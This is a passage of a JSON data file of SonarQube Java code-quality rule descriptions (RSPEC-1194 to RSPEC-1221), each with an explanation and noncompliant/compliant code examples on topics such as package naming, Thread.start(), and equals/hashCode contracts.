obj) { /* ... */ } // Compliant\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1221","summary":"Methods should not be named \"tostring\", \"hashcode\" or \"equal\"","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Java packages serve two purposes:</p>\n<ol>\n  <li> StructureâââPackages give a structure to the set of classes of your project. It is a bad practice to put all classes flat into the source\n  directory of a project without a package structure. A structure helps to mentally break down a project into smaller parts, simplifying readers'\n  understanding of how components are connected and how they interact. </li>\n  <li> Avoiding name clashesâââa class part of the <em>default package</em> if no explicit package name is specified. This can easily cause name\n  collisions when other projects define a class of the same name. </li>\n</ol>\n<p>When no package is explicitly specified for the classes in your project, this makes the project harder to understand and may cause name collisions\nwith other projects. Also, classes located in the default package not be accessed from classes within named packages since Java 1.4.</p>\n<h2>How to fix it</h2>\n<p>Move your class to a package directory and explicitly state the packageâs name at the top of the class. If your project does not have a package\nstructure, think of a structure that fits your needs. The package names should be unique to your project. You can find some best practices when\nchoosing package names in the Ressources section below.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass { /* ... */ } // Noncompliant, no package spacified\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npackage org.example; // Compliant\n\npublic class MyClass{ /* ... */ }\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-packages\">Baeldung - Guide to Java Packages</a> </li>\n  <li> <a\n  href=\"https://www.tutorialspoint.com/what-are-the-best-practices-to-keep-in-mind-while-using-packages-in-java#:~:text=Naming%20conventions%20and%20best%20practices%20for%20packages\">tutorialspoint - What are the best practices to keep in mind while using packages in Java?</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1220","summary":"The default unnamed package should not be used","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Putting multiple statements on a single line lowers the code readability and makes debugging the code more complex.</p>\n<pre>\nif (someCondition) doSomething(); // Noncompliant\n</pre>\n<p>Write one statement per line to improve readability.</p>\n<pre>\nif (someCondition) {\n  doSomething();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-122","summary":"Statements should be on separate lines","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Even if it is legal, mixing case and non-case labels in the body of a switch statement is very confusing and can even be the result of a typing\nerror.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  WEDNESDAY:   // Noncompliant; syntactically correct, but behavior is not what's expected\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    foo:for(int i = 0 ; i &lt; X ; i++) {  // Noncompliant; the code is correct and behaves as expected but is barely readable\n         /* ... */\n        break foo;  // this break statement doesn't relate to the nesting case TUESDAY\n         /* ... */\n    }\n    break;\n    /* ... */\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nswitch (day) {\n  case MONDAY:\n  case TUESDAY:\n  case WEDNESDAY:\n    doSomething();\n    break;\n  ...\n}\n\nswitch (day) {\n  case MONDAY:\n    break;\n  case TUESDAY:\n    compute(args); // put the content of the labelled \"for\" statement in a dedicated method\n    break;\n\n    /* ... */\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1219","summary":"\"switch\" statements should not contain non-case labels","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule raises an issue when <code>Thread.run()</code> is called instead of <code>Thread.start()</code>.</p>\n<h2>Why is this an issue?</h2>\n<p>The likely intention of a user calling <code>Thread.run()</code> is to start the execution of code within a new thread. This, however, is not what\nhappens when this method is called.</p>\n<p>The purpose of <code>Thread.run()</code> is to provide a method that users can overwrite to specify the code to be executed. The actual thread is\nthen started by calling <code>Thread.start()</code>. When <code>Thread.run()</code> is called directly, it will be executed as a regular method within\nthe current thread.</p>\n<h2>How to fix it</h2>\n<p>If you intend to execute the contents of the <code>Thread.run()</code> method within a new thread, call <code>Thread.start()</code> instead.</p>\n<p>If your intention is only to have a container for a method but execute this method within the current thread, do not use <code>Thread</code> but\n<code>Runnable</code> or another functional interface.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nThread myThread = new Thread(runnable);\nmyThread.run(); // Noncompliant, does not start a thread\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nThread myThread = new Thread(runnable);\nmyThread.start(); // Compliant\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nclass ComputePrimesThread extends Thread {\n    @Override\n    public void run() {\n        // ...\n    }\n}\nnew ComputePrimesThread().run(); // Noncompliant, does not start a thread\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nclass ComputePrimesThread extends Thread {\n    @Override\n    public void run() {\n        // ...\n    }\n}\nnew ComputePrimesThread().start(); // Compliant\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nclass Button {\n\n    private Thread onClick;\n\n    Button(Thread onClick) {\n        this.onClick = onClick;\n    }\n\n    private void clicked() {\n        if (onClick != null) onClick.run(); // Noncompliant, use functional interface\n    }\n}\n\nnew Button(new Thread() {\n    @Override public void run() {\n        System.out.println(\"clicked!\");\n    }\n});\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nclass Button {\n\n    private Runnable onClick;\n\n    Button(Runnable onClick) {\n        this.onClick = onClick;\n    }\n\n    private void clicked() {\n        if (onClick != null) onClick.run(); // compliant\n    }\n}\n\nnew Button(() -&gt; System.out.println(\"clicked!\"));\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/8/docs/api/java/lang/Thread.html#start--\">Javaâ¢ Platform, Standard Edition 8 API Specification -\n  Thread.start()</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.tpointtech.com/what-if-we-call-java-run-method-directly\">TPointTech - What if we call Java run() method directly instead\n  start() method?</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1217","summary":"\"Thread.run()\" should not be called directly","tags":["cwe","multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Calling <code>System.gc()</code> or <code>Runtime.getRuntime().gc()</code> is a bad idea for a simple reason: there is no way to know exactly what\nwill be done under the hood by the JVM because the behavior will depend on its vendor, version and options:</p>\n<ul>\n  <li> Will the whole application be frozen during the call? </li>\n  <li> Is the <code>-XX:DisableExplicitGC</code> option activated? </li>\n  <li> Will the JVM simply ignore the call? </li>\n  <li> â¦â </li>\n</ul>\n<p>Like for <code>System.gc()</code>, there is no reason to manually call <code>runFinalization()</code> to force the call of finalization methods of\nany objects pending finalization.</p>\n<p>An application relying on these unpredictable methods is also unpredictable and therefore broken. The task of running the garbage collector and\ncalling <code>finalize()</code> methods should be left exclusively to the JVM.</p>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1215","summary":"Execution of the Garbage Collector should be triggered only by the JVM","tags":["unpredictable","bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule raises an issue when an interface consists only of constant definitions without other members.</p>\n<h2>Why is this an issue?</h2>\n<p>An interface that consists solely of constant definitions is a bad practice. The purpose of interfaces is to provide an API, not implementation\ndetails. That is, they should provide functions in the first place and constants only to assist these functions, for example, as possible\narguments.</p>\n<p>If an interface contains constants only, move them either to somewhere else, or replace the interface with an <em>Enum</em> or a final class with a\nprivate constructor.</p>\n<h2>How to fix it</h2>\n<p>If the concrete value of the constants is not essential, and they serve as mere identifiers, replace the interface with an <code>enum</code> like\nin the following example:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic interface Status { // Noncompliant, enum should be used\n  int OPEN = 1;\n  int CLOSED = 2;\n}\n</pre>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic enum Status {      // Compliant\n  OPEN,\n  CLOSED\n}\n</pre>\n<p>In some cases, enums are not a suitable option because the concrete constant value is important. Then you should check whether it is appropriate to\nmove them to a specific existing class, for example, if that class is the primary user of the constants:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\ninterface AuxiliaryConstants { // Noncompliant, implementation detail of WordPacker\n  int BITS_PER_WORD = 16;\n  int WORD_MASK = (1 &lt;&lt; BITS_PER_WORD) - 1;\n  int HI_WORD_BK_MASK = ~(WORD_MASK &lt;&lt; BITS_PER_WORD);\n}\n\nclass WordPacker {\n  public static int getHiWord(int value) {\n    return (value &gt;&gt;&gt; AuxiliaryConstants.BITS_PER_WORD);\n  }\n\n  public static int setHiWord(int value, int wordValue) {\n    return (value &amp; AuxiliaryConstants.HI_WORD_BK_MASK) |\n      (wordValue &lt;&lt; AuxiliaryConstants.BITS_PER_WORD);\n  }\n}\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nclass WordPacker { // Compliant\n  private static final int BITS_PER_WORD = 16;\n  private static final int WORD_MASK = (1 &lt;&lt; BITS_PER_WORD) - 1;\n  private static final int HI_WORD_BK_MASK = ~(WORD_MASK &lt;&lt; BITS_PER_WORD);\n\n  public static int getHiWord(int value) {\n      return (value &gt;&gt;&gt; BITS_PER_WORD);\n  }\n\n  public static int setHiWord(int value, int wordValue) {\n    return (value &amp; HI_WORD_BK_MASK) | (wordValue &lt;&lt; BITS_PER_WORD);\n  }\n}\n</pre>\n<p>If this is not the case and several classes are using the constants equally, you should use a final class with a private constructor. Unlike\ninterfaces, they can neither be inherited from nor instantiated.</p>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\npublic interface ColorTheme { // Noncomplient, final class should be used\n  int COLOR_ERROR = 0xff0000;   // red\n  int COLOR_WARNING = 0xffff00; // yellow\n  int COLOR_OK = 0x00cf00;      // green\n}\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\npublic final class ColorTheme { // Compliant\n  public static final int COLOR_ERROR = 0xff0000;   // red\n  public static final int COLOR_WARNING = 0xffff00; // yellow\n  public static final int COLOR_OK = 0x00cf00;      // green\n\n  private ColorTheme() {}\n}\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://dzone.com/articles/reasons-why-the-constant-interface-pattern-is-disc\">Mohammad Nadeem - Why the Constant Interface Pattern\n  Should Be Discouraged</a> </li>\n  <li> Joshua Bloch - Effective Java, ISBN 9780134686097 </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1214","summary":"Interfaces should not solely consist of constants","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>According to the Java Code Conventions as defined by Oracle, the members of a class or interface declaration should appear in the following order\nin the source files:</p>\n<ul>\n  <li> Class variables </li>\n  <li> Instance variables </li>\n  <li> Constructors </li>\n  <li> Methods </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo{\n   private int field = 0;\n   public boolean isTrue() {...}\n   public Foo() {...}                         // Noncompliant, constructor defined after methods\n   public static final int OPEN = 4;  //Noncompliant, variable defined after constructors and methods\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Foo{\n   public static final int OPEN = 4;\n   private int field = 0;\n   public Foo() {...}\n   public boolean isTrue() {...}\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1213","summary":"The members of an interface or class declaration should appear in a pre-defined order","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>According to the Java <code>Comparable.compareTo(T o)</code> documentation:</p>\n<blockquote>\n  <p>It is strongly recommended, but not strictly required that <code>(x.compareTo(y)==0) == (x.equals(y))</code>.</p>\n  <p>Generally speaking, any class that implements the Comparable interface and violates this condition should clearly indicate this fact.</p>\n  <p>The recommended language is \"Note: this class has a natural ordering that is inconsistent with equals.\"</p>\n</blockquote>\n<p>If this rule is violated, weird and unpredictable failures can occur.</p>\n<p>For example, in Java 5 the <code>PriorityQueue.remove()</code> method relied on <code>compareTo()</code>, but since Java 6 it has relied on\n<code>equals()</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Noncompliant as the equals(Object obj) method is not overridden\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Foo implements Comparable&lt;Foo&gt; {\n  @Override\n  public int compareTo(Foo foo) { /* ... */ }      // Compliant\n\n  @Override\n  public boolean equals(Object obj) { /* ... */ }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1210","summary":"\"equals(Object obj)\" should be overridden along with the \"compareTo(T obj)\" method","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Control structures are code statements that impact the programâs control flow (e.g., if statements, for loops, etc.)</p>\n<h2>Why is this an issue?</h2>\n<p>While not technically incorrect, the omission of curly braces can be misleading and may lead to the introduction of errors during maintenance.</p>\n<p>In the following example, the two calls seem to be attached to the <code>if</code> statement, but only the first one is, and\n<code>checkSomething</code> will always be executed:</p>\n<pre>\nif (condition)  // Noncompliant\n  executeSomething();\n  checkSomething();\n</pre>\n<p>Adding curly braces improves the code readability and its robustness:</p>\n<pre>\nif (condition) {\n  executeSomething();\n  checkSomething();\n}\n</pre>\n<p>The rule raises an issue when a control structure has no curly braces.</p>\n<h3>Exceptions</h3>\n<p>The rule doesnât raise an issue when the body of an <code>if</code> statement is a single <code>return</code>, <code>break</code>, or\n<code>continue</code> and is on the same line.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/MzZGBQ\">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-121","summary":"Control structures should use curly braces","tags":["cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>According to the Java Language Specification, there is a contract between <code>equals(Object)</code> and <code>hashCode()</code>:</p>\n<blockquote>\n  <p>If two objects are equal according to the <code>equals(Object)</code> method, then calling the <code>hashCode</code> method on each of the two\n  objects must produce the same integer result.</p>\n  <p>It is not required that if two objects are unequal according to the <code>equals(java.lang.Object)</code> method, then calling the\n  <code>hashCode</code> method on each of the two objects must produce distinct integer results.</p>\n  <p>However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of\n  hashtables.</p>\n</blockquote>\n<p>In order to comply with this contract, those methods should be either both inherited, or both overridden.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyClass {    // Noncompliant - should also override \"hashCode()\"\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass MyClass {    // Compliant\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n  @Override\n  public int hashCode() {\n    /* ... */\n  }\n\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/581\">CWE-581 - Object Model Violation: Just One of Equals and Hashcode Defined</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/7DVGBQ\">CERT, MET09-J.</a> - Classes that define an equals() method must also define a\n  hashCode() method </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1206","summary":"\"equals(Object obj)\" and \"hashCode()\" should be overridden in pairs","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>In Java, the <code>Object.equals()</code> method is used for object comparison, and it is typically overridden in classes to provide a custom\nequality check based on your criteria for equality.</p>\n<p>The default implementation of <code>equals()</code> provided by the <code>Object</code> class compares the memory references of the two objects,\nthat means it checks if the objects are actually the same instance in memory.</p>\n<p>The \"equals\" as a method name should be used exclusively to override <code>Object.equals(Object)</code> to prevent confusion.</p>\n<p>It is important to note that when you override <code>equals()</code>, you should also override the <code>hashCode()</code> method to maintain the\ncontract between <code>equals()</code> and <code>hashCode()</code>.</p>\n<h2>How to fix it</h2>\n<p>Either override <code>Object.equals(Object)</code> or rename the method.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyClass {\n  private int foo = 1;\n\n  public boolean equals(MyClass o) {  // Noncompliant; does not override Object.equals(Object)\n    return o != null &amp;&amp; o.foo == this.foo;\n  }\n\n  public static void main(String[] args) {\n    MyClass o1 = new MyClass();\n    Object o2 = new MyClass();\n    System.out.println(o1.equals(o2));  // Prints \"false\" because o2 an Object not a MyClass\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass MyClass {\n  private int foo = 1;\n\n  @Override\n  public boolean equals(Object o) {  // Compliant\n    if (this == o) {\n        return true;\n    }\n\n    if (o == null || getClass() != o.getClass()) {\n      return false;\n    }\n\n    MyClass other = (MyClass)o;\n    return this.foo == other.foo;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/Object.html#equals(java.lang.Object)\">Oracle SDK -\n  Object.equals(Object)</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1201","summary":"\"equals\" method overrides should accept \"Object\" parameters","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>According to the Single Responsibility Principle, introduced by Robert C. Martin in his book \"Principles of Object Oriented Design\", a class should\nhave only one responsibility:</p>\n<blockquote>\n  <p>If a class has more than one responsibility, then the responsibilities become coupled.</p>\n  <p>Changes to one responsibility may impair or inhibit the class' ability to meet the others.</p>\n  <p>This kind of coupling leads to fragile designs that break in unexpected ways when changed.</p>\n</blockquote>\n<p>Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.</p>\n<p>Nested classes dependencies are not counted as dependencies of the outer class.</p>\n<h3>Noncompliant code example</h3>\n<p>With a threshold of 5:</p>\n<pre>\nclass Foo {                        // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7\n  T1 a1;                           // Foo is coupled to T1\n  T2 a2;                           // Foo is coupled to T2\n  T3 a3;                           // Foo is coupled to T3\n\n  public T4 compute(T5 a, T6 b) {  // Foo is coupled to T4, T5 and T6\n    T7 result = a.getResult(b);    // Foo is coupled to T7\n    return result;\n  }\n\n  public static class Bar {        // Compliant - Bar depends on 2 classes: T8 and T9\n    T8 a8;\n    T9 a9;\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1200","summary":"Classes should not be coupled to too many other classes","tags":["architecture","brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared naming conventions improve readability and allow teams to collaborate efficiently. This rule checks that all package names match a provided\nregular expression.</p>\n<h2>How to fix it</h2>\n<p>Rename packages with the expected naming convention</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>With the default regular expression <code>^[a-z_]+(\\.[a-z_][a-z0-9_]*)*$</code>:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npackage org.exAmple; // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npackage org.example;\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-120","summary":"Package names should comply with a naming convention","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"IDENTIFIABLE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Nested code blocks create new scopes where variables declared within are inaccessible from the outside, and their lifespan ends with the block.</p>\n<p>Although this may appear beneficial, their usage within a function often suggests that the function is overloaded. Thus, it may violate the Single\nResponsibility Principle, and the function needs to be broken down into smaller functions.</p>\n<p>The presence of nested blocks that donât affect the control flow might suggest possible mistakes in the code.</p>\n<h3>Exceptions</h3>\n<p>The usage of a code block after a <code>case</code> is allowed.</p>\n<h2>How to fix it</h2>\n<p>The nested code blocks should be extracted into separate methods.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Example {\n\n    private final Deque&lt;Integer&gt; stack = new LinkedList&lt;&gt;();\n\n    public void evaluate(int operator) {\n      switch (operator) {\n        case ADD: {\n          /* ... */\n          { // Noncompliant - Extract this nested code block into a method\n            int a = stack.pop();\n            int b = stack.pop();\n            int result = a + b;\n            stack.push(result);\n          }\n          /* ... */\n          break;\n        }\n        /* ... */\n      }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Example {\n\n    private final Deque&lt;Integer&gt; stack = new LinkedList&lt;&gt;();\n\n    public void evaluate(int operator) {\n      switch (operator) {\n        case ADD: {\n          /* ... */\n          evaluateAdd();\n          /* ... */\n          break;\n        }\n        /* ... */\n      }\n    }\n\n    private void evaluateAdd() {\n      int a = stack.pop();\n      int b = stack.pop();\n      int result = a + b;\n      stack.push(result);\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Wikipedia - <a href=\"https://en.wikipedia.org/wiki/Single-responsibility_principle\">Single Responsibility Principle</a> </li>\n  <li> Baeldung - <a href=\"https://www.baeldung.com/java-single-responsibility-principle\">Single Responsibility Principle</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1199","summary":"Nested code blocks should not be used","tags":["bad-practice"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Array designators should always be located on the type for better code readability. Otherwise, developers must look both at the type and the\nvariable name to know whether or not a variable is an array.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint matrix[][];   // Noncompliant\nint[] matrix[];   // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint[][] matrix;   // Compliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-1197","summary":"Array designators \"[]\" should be on the type, not the variable","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Placing the array designators <code>[]</code> after the type helps maintain backward compatibility with older versions of the Java SE platform.\nThis syntax contributes to better readability as it becomes easier to distinguish between array types and non-array types. It helps convey the\nintention of the method to both the developer implementing it and the developer using it.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Cube {\n    private int magicNumbers[] = { 42 };      // Noncompliant\n    public int getVector()[] { /* ... */ }    // Noncompliant\n    public int[] getMatrix()[] { /* ... */ }  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Cube {\n    private int[] magicNumbers = { 42 };      // Compliant\n    public int[] getVector() { /* ... */ }    // Compliant\n    public int[][] getMatrix() { /* ... */ }  // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se20/html/jls-10.html\">Oracle Java Language Specification</a> - Arrays </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1195","summary":"Array designators \"[]\" should be located after the type in method signatures","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>java.lang.Error</code> and its subclasses represent abnormal conditions, such as <code>OutOfMemoryError</code>, which should only be\nencountered by the Java Virtual Machine.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyException extends Error { /* ... */ }       // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class MyException extends Exception { /* ... */ }   // Compliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1194","summary":"\"java.lang.Error\" should not be extended","tags":["error-handling"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A <code>try-catch</code> block is used to handle exceptions or errors that may occur during the 